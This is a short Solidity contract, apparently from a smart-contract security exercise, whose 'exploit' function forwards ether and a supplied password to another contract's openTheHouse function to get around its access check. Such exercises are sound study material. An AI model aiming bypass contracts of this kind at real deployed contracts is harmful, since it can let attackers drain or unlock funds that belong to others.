contract ByPassHouse {
    
    address payable originalContract;
    
    constructor(address payable _originalContract) public payable {
        originalContract = _originalContract;
    }
    
    function exploit(bytes32 _password) public payable {
        bytes memory payload = abi.encodeWithSignature("openTheHouse(bytes32)", _password);
        originalContract.call.value(msg.value)(payload);
    }
}
